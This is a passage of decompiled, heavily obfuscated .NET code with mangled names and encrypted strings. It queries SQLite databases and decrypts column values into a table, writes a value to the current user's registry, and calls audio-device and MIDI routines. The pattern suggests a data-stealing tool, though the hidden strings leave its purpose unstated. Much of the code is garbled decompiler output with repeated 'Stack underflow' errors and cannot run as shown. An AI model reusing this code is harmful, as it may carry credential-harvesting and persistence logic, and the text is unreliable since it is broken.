			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362308), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362799), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362814), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107352010), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107352021), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107351968), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107351943), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107351962), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107351905), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107351900), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107351847), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107351858), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107351837), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107351272), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107351283), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107351262), _0091._0080_0004(typeof(string).TypeHandle));
			if (global::_001C._0096_0003(_0003))
			{
				_0003 = _0080._0014._0001(107401775);
			}
			string text = ((_009D_0003._009D_0007(_0003, _0080._0014._0001(107401766), StringComparison.OrdinalIgnoreCase) == 0) ? _0080._0014._0001(107362630) : _0080._0014._0001(107362683));
			global::_0008._007E_0011_0002(dataTable);
			global::_0010._001C obj = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107362605), new object[2] { _0003, text }), _0002);
			try
			{
				_0014 obj2 = _0018._0001(obj);
				try
				{
					while (global::_001B._007E_008F_0003(obj2))
					{
						if (!global::_001C._0096_0003(_0004) && _009D_0003._009D_0007(_0004, _009E_0003._007E_0001_0008(obj2, 2), StringComparison.OrdinalIgnoreCase) != 0)
						{
							continue;
						}
						try
						{
							_001D._0019 obj3 = new _001D._0019();
							try
							{
								global::_0010._001C obj4 = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107351213), new object[2]
								{
									_0003,
									_009E_0003._007E_0001_0008(obj2, 2)
								}), _0002);
								try
								{
									_0014 obj5 = _0018._0001(obj4);
									try
									{
										while (global::_001B._007E_008F_0003(obj5))
										{
											DataRow dataRow = _0005_0005._007E_008E_000E(dataTable);
											_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362379), _0003);
											_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362361), _0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107351196), new object[3]
											{
												_008F_0004._007E_0016_000E(obj2, 2),
												_0004_0005._007E_008D_000E(obj5, 0),
												_0004_0005._007E_008D_000E(obj5, 1)
											}));
											_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362308), _0003);
											_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362814), _0018_0006._007E_0007_0010(obj3, _009E_0003._007E_0001_0008(obj2, 2)));
											_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107352010), _0080._0014._0001(107351143));
											_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107352021), false);
											_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107351968), false);
											_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107351943), _008F_0004._007E_0016_000E(obj5, 0));
											_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107351962), _0018_0006._007E_0007_0010(obj3, global::_0002._007E_0006(_008F_0004._007E_0016_000E(obj5, 3))));
											_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107351900), _0003);
											_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107351858), _0018_0006._007E_0007_0010(obj3, global::_0002._007E_0006(_008F_0004._007E_0016_000E(obj5, 2))));
											_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107351837), _0018_0006._007E_0007_0010(obj3, global::_0002._007E_0006(_008F_0004._007E_0016_000E(obj5, 4))));
											_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107351905), _008F_0004._007E_0016_000E(obj5, 1));
											dataRow[_0080._0014._0001(107351272)] = ((global::_001A._007E_001C_0003(obj5) > 5) ? _008F_0004._007E_0016_000E(obj5, 5) : string.Empty);
											dataRow[_0080._0014._0001(107351283)] = ((global::_001A._007E_001C_0003(obj5) > 6) ? _008F_0004._007E_0016_000E(obj5, 6) : string.Empty);
											dataRow[_0080._0014._0001(107351262)] = ((global::_001A._007E_001C_0003(obj5) > 7) ? _008F_0004._007E_0016_000E(obj5, 7) : string.Empty);
											if (global::_001C._0096_0003(P_3) || _009D_0003._009D_0007(P_3, global::_0002._007E_0006(_0006_0004._007E_0010_0008(dataRow, _0080._0014._0001(107362361))), StringComparison.OrdinalIgnoreCase) == 0)
											{
												_0007_0005._007E_0090_000E(_0006_0005._007E_008F_000E(dataTable), dataRow);
											}
										}
									}
									finally
									{
										if (obj5 != null)
										{
											global::_0008._007E_0098(obj5);
										}
									}
								}
								finally
								{
									if (obj4 != null)
									{
										global::_0008._007E_0098(obj4);
									}
								}
							}
							finally
							{
								if (obj3 != null)
								{
									global::_0008._007E_0098(obj3);
								}
							}
						}
						catch (SQLiteException)
						{
						}
					}
				}
				finally
				{
					if (obj2 != null)
					{
						global::_0008._007E_0098(obj2);
					}
				}
			}
			finally
			{
				if (obj != null)
				{
					global::_0008._007E_0098(obj);
				}
			}
			global::_0008._007E_0012_0002(dataTable);
			global::_0008._007E_0013_0002(dataTable);
			return dataTable;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("winmm.dll", EntryPoint = "waveOutClose")]
		static extern MmResult _0001(IntPtr _0002);

		static void _0001(byte[] _0002, global::_0001._007F P_1)
		{
			//IL_0047: Incompatible stack heights: 0 vs 2
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((global::_0001._007F)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_004e: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				new InvalidOperationException();
				throw /*Error near IL_0018: Stack underflow*/;
			}
			if (_0002 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107388827));
			}
			_0018._0001(P_1._0001, _0002, _0002.Length, _0099._008E_0004(-1));
		}

		static byte[] _0001(int _0002, global::_0004._0008 P_1)
		{
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Unknown result type (might be due to invalid IL or missing references)
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_002f: Unknown result type (might be due to invalid IL or missing references)
			//IL_003f: Incompatible stack heights: 0 vs 4
			//IL_0042: Incompatible stack heights: 0 vs 3
			//IL_0045: Incompatible stack heights: 0 vs 3
			_ = new byte[4];
			_ = 0;
			_003F val = /*Error near IL_000d: Stack underflow*/>> 24;
			((sbyte[])/*Error near IL_0015: Stack underflow*/)[/*Error near IL_0015: Stack underflow*/] = (sbyte)(byte)(val & 0xFF);
			/*Error near IL_0015: Stack underflow*/;
			_ = 1;
			_003F val2 = /*Error near IL_001c: Stack underflow*/>> 16;
			((sbyte[])/*Error near IL_0024: Stack underflow*/)[/*Error near IL_0024: Stack underflow*/] = (sbyte)(byte)(val2 & 0xFF);
			/*Error near IL_0024: Stack underflow*/;
			_ = 2;
			_003F val3 = /*Error near IL_002a: Stack underflow*/>> 8;
			((sbyte[])/*Error near IL_0032: Stack underflow*/)[/*Error near IL_0032: Stack underflow*/] = (sbyte)(byte)(val3 & 0xFF);
			((sbyte[])/*Error near IL_0032: Stack underflow*/)[3] = (sbyte)(byte)(_0002 & 0xFF);
			return (byte[])/*Error near IL_003e: Stack underflow*/;
		}

		static int _0001(global::_0017._0080 P_0)
		{
			//IL_002b: Incompatible stack heights: 0 vs 1
			if (0 == 0)
			{
				_0018._0001((global::_0017._0080)/*Error near IL_0032: Stack underflow*/);
			}
			int result = -1;
			if (P_0._0001 != null)
			{
				result = P_0._0001.Count;
				P_0._0001.Clear();
			}
			return result;
		}

		static void _0001(global::_0017._007F._0006 _0002, byte[] P_1)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			global::_0017._007F._0008 obj = ((global::_0017._007F._0006)/*Error near IL_0009: Stack underflow*/)._0001;
			_0018._0001((byte[])/*Error near IL_0017: Stack underflow*/, obj);
		}

		unsafe static bool _0001(ref byte _0002, NumberStyles _0003, [Out] string _0004)
		{
			//IL_0013: Incompatible stack heights: 0 vs 2
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 2
			_ = _0019_0006._000E_0010;
			_ = null;
			return /*Error near IL_0011: Stack underflow*/((string)/*Error near IL_0011: Stack underflow*/, (NumberStyles)/*Error near IL_0011: Stack underflow*/, (IFormatProvider)/*Error near IL_0011: Stack underflow*/, ref *(byte*)/*Error near IL_0011: Stack underflow*/);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0008._0001 P_0)
		{
			//IL_022c: Incompatible stack heights: 0 vs 5
			//IL_0236: Incompatible stack heights: 0 vs 3
			//IL_0240: Incompatible stack heights: 0 vs 3
			_ = _0081._0005_0004;
			(new string[12])[0] = global::_0015._0001._0014;
			_ = 1;
			_0080._0014._0001(107351158);
			((object[])/*Error near IL_0022: Stack underflow*/)[/*Error near IL_0022: Stack underflow*/] = (object)/*Error near IL_0022: Stack underflow*/;
			((object[])/*Error near IL_0022: Stack underflow*/)[2] = global::_0015._0001._0012;
			/*Error near IL_002a: Stack underflow*/;
			_ = 3;
			_0080._0014._0001(107351158);
			((object[])/*Error near IL_0037: Stack underflow*/)[/*Error near IL_0037: Stack underflow*/] = (object)/*Error near IL_0037: Stack underflow*/;
			((object[])/*Error near IL_0037: Stack underflow*/)[4] = global::_0015._0001._0013;
			/*Error near IL_003f: Stack underflow*/;
			_ = 5;
			_0080._0014._0001(107351158);
			((object[])/*Error near IL_004c: Stack underflow*/)[/*Error near IL_004c: Stack underflow*/] = (object)/*Error near IL_004c: Stack underflow*/;
			((object[])/*Error near IL_004c: Stack underflow*/)[6] = global::_0015._0001._0015;
			((object[])/*Error near IL_0054: Stack underflow*/)[7] = _0080._0014._0001(107351158);
			((object[])/*Error near IL_0061: Stack underflow*/)[8] = global::_0015._0001._0001();
			((object[])/*Error near IL_0069: Stack underflow*/)[9] = _0080._0014._0001(107351158);
			((object[])/*Error near IL_0077: Stack underflow*/)[10] = global::_0015._0001._0011;
			((object[])/*Error near IL_0080: Stack underflow*/)[11] = _0080._0014._0001(107351158);
			string text = /*Error near IL_0093: Stack underflow*/((string[])/*Error near IL_0093: Stack underflow*/);
			text = global::_000F._008B_0002(text, global::_0002._007E_0006(_0080._0014._0001(107351153)));
			text = _0081._0005_0004(new string[5]
			{
				text,
				_0080._0014._0001(107351158),
				_0018._0001(),
				_0080._0014._0001(107351158),
				global::_0002._007E_0006(global::_0015._0001._0006)
			});
			byte[] array = _0018._0001(text);
			_0018._0001(P_0, array, global::_0002._007E_0006(_0080._0014._0001(107351116)), false);
			if (!P_0._0004 && global::_001C._0095_0003(global::_000F._008B_0002(_0018._0001(), global::_0015._0001._000F)))
			{
				P_0._0004 = true;
			}
			if (P_0._0004)
			{
				_0018._0001(P_0, (byte[])null, global::_0011._008E_0002(_0080._0014._0001(107351123), _0018._0001(), global::_0015._0001._000F), false);
			}
			if (global::_001C._0097_0003(global::_000F._008B_0002(_0018._0001(), global::_0015._0001._0002)))
			{
				_0018._0001(P_0, (byte[])null, global::_0011._008E_0002(global::_000E._008A_0002(_0080._0014._0001(107351098), new char[1] { '!' })[0], _0018._0001(), global::_0015._0001._000F), false);
			}
			if (P_0._000E)
			{
				_0018._0001(P_0, (byte[])null, global::_000E._008A_0002(_0080._0014._0001(107351061), new char[1] { '!' })[0], false);
			}
		}

		static void _0001(global::_0016._001D P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0016._001D)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0016._001D).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		unsafe static DateTime _0001(long _0002, DateTimeKind _0003)
		{
			//IL_001e: Incompatible stack heights: 0 vs 3
			//IL_0025: Incompatible stack heights: 0 vs 1
			DateTime dateTime = global::_0001._001A._0001;
			_ = _0095_0003._0094_0007;
			_ = ref dateTime;
			double value = (double)/*Error near IL_0011: Stack underflow*/;
			((DateTime*)/*Error near IL_0025: Stack underflow*/)->AddSeconds(value);
			return /*Error near IL_0019: Stack underflow*/((DateTime)/*Error near IL_0019: Stack underflow*/, _0003);
		}

		static void _0001()
		{
			if (_001B._0013._0001)
			{
				_0018._0001();
				_001B._0013._0001 = false;
			}
		}

		[DllImport("Msacm32.dll", EntryPoint = "acmFormatEnum")]
		static extern MmResult _0001(IntPtr _0002, ref _001F._0008 _0003, global::_0008._0008._0002 _0004, IntPtr _0005, _001E._000F _0006);

		static _0080._0017 _0001(global::_0017._0080 P_0)
		{
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0031: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107351536));
			}
			return P_0._0001._0003();
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static int _0001(double _0002)
		{
			//IL_000b: Invalid comparison between Unknown and F8
			//IL_0018: Invalid comparison between Unknown and F8
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 1
			if (!((double)/*Error near IL_000d: Stack underflow*/ < -1.0))
			{
				if ((double)/*Error near IL_001a: Stack underflow*/ > 1.0)
				{
					_ = 1.0;
				}
			}
			else
			{
				_ = -1.0;
			}
			_0002 = (double)/*Error near IL_0034: Stack underflow*/;
			return (int)(_0002 * 2147483647.0);
		}

		static double _0001(double _0002, global::_000E._0019._0001 P_1)
		{
			//IL_0004: Incompatible stack heights: 0 vs 1
			return (double)/*Error near IL_0003: Stack underflow*/;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("Msacm32.dll", EntryPoint = "acmStreamClose")]
		static extern MmResult _0001(IntPtr _0002, int _0003);

		static void _0001(global::_0016._0014 _0002, int P_1)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 2
			_ = ((global::_0016._0014)/*Error near IL_0007: Stack underflow*/)._0001;
			((List<IList<global::_0013._0010>>)/*Error near IL_0017: Stack underflow*/).RemoveAt((int)/*Error near IL_0017: Stack underflow*/);
		}

		static int _0001(int _0002, global::_0006._0010 P_1)
		{
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return 0;
			}
			_ = ((global::_0006._0010)/*Error near IL_000d: Stack underflow*/)._0001;
			_0018._0001(_0018._0001((IntPtr)/*Error near IL_0017: Stack underflow*/, (int)/*Error near IL_0017: Stack underflow*/, out int result, _0080._0008._0002), _0080._0014._0001(107351431));
			return result;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_context_collseq_interop")]
		static extern IntPtr _0001(IntPtr _0002, ref int _0003, ref int _0004, ref int _0005);

		static float _0001(_001D._0016 _0002, float P_1)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_0038: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Unknown result type (might be due to invalid IL or missing references)
			//IL_0049: Expected F8, but got Unknown
			//IL_0078: Incompatible stack heights: 0 vs 1
			//IL_007e: Incompatible stack heights: 0 vs 2
			//IL_0081: Incompatible stack heights: 0 vs 2
			_ = ((_001D._0016)/*Error near IL_0007: Stack underflow*/)._0001;
			double num = (double)/*Error near IL_000a: Stack underflow*/;
			_ = /*Error near IL_000b: Stack underflow*/* num;
			double num2 = ((_001D._0016)/*Error near IL_0012: Stack underflow*/)._0002;
			float num3 = _0002._0001;
			double num4 = /*Error near IL_001b: Stack underflow*/+ num2 * (double)num3 + _0002._0003 * (double)_0002._0002 - _0002._0004 * (double)_0002._0003 - _0002._0005 * (double)_0002._0004;
			_0002._0002 = _0002._0001;
			_0002._0001 = P_1;
			_0002._0004 = _0002._0003;
			_0002._0003 = (float)num4;
			return _0002._0003;
		}

		static void _0001(string _0002, string _0003)
		{
			//IL_00bf: Incompatible stack heights: 0 vs 2
			//IL_00c9: Incompatible stack heights: 0 vs 1
			try
			{
				_ = global::_0002._007E_0006;
				_0080._0014._0001(107351442);
				/*Error near IL_00c9: Stack underflow*/((object)/*Error near IL_00c9: Stack underflow*/);
				string text = (string)/*Error near IL_00cf: Stack underflow*/;
				RegistryKey registryKey = _001A_0006._007E_000F_0010(Registry.CurrentUser, global::_0002._007E_0006(text), true);
				object obj = _0006_0004._007E_0011_0008(registryKey, global::_000F._008B_0002(global::_0015._0001._0010, _0003));
				if (obj == null)
				{
					_0083_0004._007E_0094_0008(registryKey, global::_000F._008B_0002(global::_0015._0001._0010, _0003), _0002);
				}
				else if (_0010_0003._008C_0006(global::_0002._007E_0006(obj), _0002))
				{
					_0083_0004._007E_0094_0008(registryKey, global::_000F._008B_0002(global::_0015._0001._0010, _0003), _0002);
				}
			}
			catch
			{
			}
		}

		static void _0001(global::_0001._0082 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0001._0082)/*Error near IL_0007: Stack underflow*/)._0004)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0001._0082).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static System.Data.IsolationLevel _0001()
		{
			return System.Data.IsolationLevel.Serializable;
		}

		static void _0001(global::_0012._0014 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0012._0014)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0012._0014).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static global::_0005._0005 _0001(int _0002, int _0003)
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Expected I4, but got Unknown
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 2
			_ = 8;
			return _0018._0001(_0005: /*Error near IL_0009: Stack underflow*/* _0002, _0002: (int)/*Error near IL_0010: Stack underflow*/, _0003: (int)/*Error near IL_0010: Stack underflow*/, _0004: (int)/*Error near IL_0010: Stack underflow*/, _0006: WaveFormatEncoding.ALaw, _0007: _0003);
		}

		static void _0001(BinaryWriter _0002, _001A._0005 P_1)
		{
			//IL_002e: Incompatible stack heights: 0 vs 2
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_0038: Incompatible stack heights: 0 vs 2
			_ = _009E_0002._007E_001B_0006;
			/*Error near IL_0035: Stack underflow*/((object)/*Error near IL_0035: Stack underflow*/, 4, SeekOrigin.Begin);
			_ = _0084_0005._007E_0014_000F;
			long num = global::_0012._007E_0090_0002(P_1._0001);
			/*Error near IL_002c: Stack underflow*/((object)/*Error near IL_002c: Stack underflow*/, (uint)(num - 8));
		}

		static void _0001(int _0002, float[] _0003, int _0004, global::_000F._0006 P_3)
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected F4, but got Unknown
			//IL_0074: Incompatible stack heights: 0 vs 1
			//IL_007a: Incompatible stack heights: 0 vs 2
			int num = 0;
			while (num < _0004)
			{
				_ = (float)((global::_000F._0006)/*Error near IL_000c: Stack underflow*/)._0001;
				int num2 = ((global::_000F._0006)/*Error near IL_0014: Stack underflow*/)._0002;
				float num3 = /*Error near IL_0016: Stack underflow*// (float)num2;
				for (int i = 0; i < P_3._0001.WaveFormat._0001; i++)
				{
					_0003[_0002 + num++] *= num3;
				}
				P_3._0001++;
				if (P_3._0001 > P_3._0002)
				{
					P_3._0001 = global::_000F._0006._0001._0003;
					break;
				}
			}
		}

		static void _0001()
		{
			_0018._0001();
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0013._0010 _0001(int _0002)
		{
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_01ac: Incompatible stack heights: 0 vs 1
			//IL_01b2: Expected I4, but got Unknown
			long num = 0L;
			long num2 = default(long);
			if (0 == 0)
			{
				num2 = num;
			}
			int num3 = /*Error near IL_0014: Stack underflow*/& 0xFF;
			int num4 = (_0002 >> 8) & 0xFF;
			int num5 = (_0002 >> 16) & 0xFF;
			int num6 = 1;
			MidiCommandCode midiCommandCode;
			if ((num3 & 0xF0) == 240)
			{
				midiCommandCode = (MidiCommandCode)num3;
			}
			else
			{
				midiCommandCode = (MidiCommandCode)((uint)num3 & 0xF0u);
				num6 = (num3 & 0xF) + 1;
			}
			switch (midiCommandCode)
			{
			case MidiCommandCode.NoteOff:
			case MidiCommandCode.NoteOn:
			case MidiCommandCode.KeyAfterTouch:
				if (num5 > 0 && midiCommandCode == MidiCommandCode.NoteOn)
				{
					return new _007F._0010(num2, num6, num4, num5, 0);
				}
				return new global::_0013._0011(num2, num6, midiCommandCode, num4, num5);
			case MidiCommandCode.ControlChange:
				return new global::_0004._0010(num2, num6, (MidiController)num4, num5);
			case MidiCommandCode.PatchChange:
				return new global::_0007._0012(num2, num6, num4);
			case MidiCommandCode.ChannelAfterTouch:
				return new _001C._0008(num2, num6, num4);
			case MidiCommandCode.PitchWheelChange:
				return new _001C._000E(num2, num6, num4 + (num5 << 7));
			case MidiCommandCode.TimingClock:
			case MidiCommandCode.StartSequence:
			case MidiCommandCode.ContinueSequence:
			case MidiCommandCode.StopSequence:
			case MidiCommandCode.AutoSensing:
				return new global::_0013._0010(num2, num6, midiCommandCode);
			default:
				throw new FormatException(_0008_0002._0007_0005(_0080._0014._0001(107351381), midiCommandCode));
			}
		}

		static byte[] _0001(global::_0012._0003 _0002, int P_1)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			if (((global::_0012._0003)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = ((global::_0012._0003)/*Error near IL_0010: Stack underflow*/)._0001.Length;
				if (/*Error near IL_0016: Stack underflow*/ >= /*Error near IL_0016: Stack underflow*/)
				{
					goto IL_0024;
				}
			}
			_0002._0001 = new byte[P_1 * 2];
			goto IL_0024;
			IL_0024:
			return _0002._0001;
		}

		static void _0001(_001A._0005 P_0)
		{
			//IL_006f: Incompatible stack heights: 0 vs 1
			//IL_0076: Incompatible stack heights: 0 vs 1
			//IL_0079: Incompatible stack heights: 0 vs 2
			_0018._0001((_001A._0005)/*Error near IL_0076: Stack underflow*/);
			if ((int)/*Error near IL_0006: Stack underflow*/ != 0)
			{
				_ = _009F_0002._007E_001C_0006;
				BinaryWriter binaryWriter = ((_001A._0005)/*Error near IL_0012: Stack underflow*/)._0001;
				byte[] array = _0087_0003._007E_0081_0007(_0082_0002._0088_0005(), _0080._0014._0001(107351312));
				/*Error near IL_0035: Stack underflow*/(binaryWriter, array);
				_009D_0002._007E_0016_0006(P_0._0001, 4);
				P_0._0002 = global::_0012._007E_0091_0002(P_0._0001);
				_009D_0002._007E_0016_0006(P_0._0001, 0);
			}
		}

		static void _0001(_0005 P_0)
		{
			//IL_009e: Incompatible stack heights: 0 vs 1
			//IL_00a4: Incompatible stack heights: 0 vs 2
			//IL_00aa: Incompatible stack heights: 0 vs 3
			_ = ((_0005)/*Error near IL_000a: Stack underflow*/)._0001;
			_ = ((_0005)/*Error near IL_0014: Stack underflow*/)._0001;
			_ = _0098._0089_0004;
			_007F._0006 obj = ((_0005)/*Error near IL_0023: Stack underflow*/)._0001;
			_0018._0001(_0018._0001(_0004: /*Error near IL_0028: Stack underflow*/(obj), _0002: (IntPtr)/*Error near IL_002d: Stack underflow*/, _0003: (_007F._0006)/*Error near IL_002d: Stack underflow*/), _0080._0014._0001(107350759));
			_0018._0001(_0018._0001(P_0._0001, P_0._0001, _0098._0089_0004(P_0._0001)), _0080._0014._0001(107386153));
			_0018._0001(_0018._0001(P_0._0001, P_0._0001, _0098._0089_0004(P_0._0001)), _0080._0014._0001(107350730));
		}

		static byte[] _0001(string _0002, string _0003)
		{
			//IL_0168: Incompatible stack heights: 0 vs 2
			//IL_0172: Incompatible stack heights: 0 vs 1
			//IL_017c: Incompatible stack heights: 0 vs 1
			_ = global::_001C._0096_0003;
			/*Error near IL_0172: Stack underflow*/((string)/*Error near IL_0172: Stack underflow*/);
			if ((int)/*Error near IL_0011: Stack underflow*/ != 0)
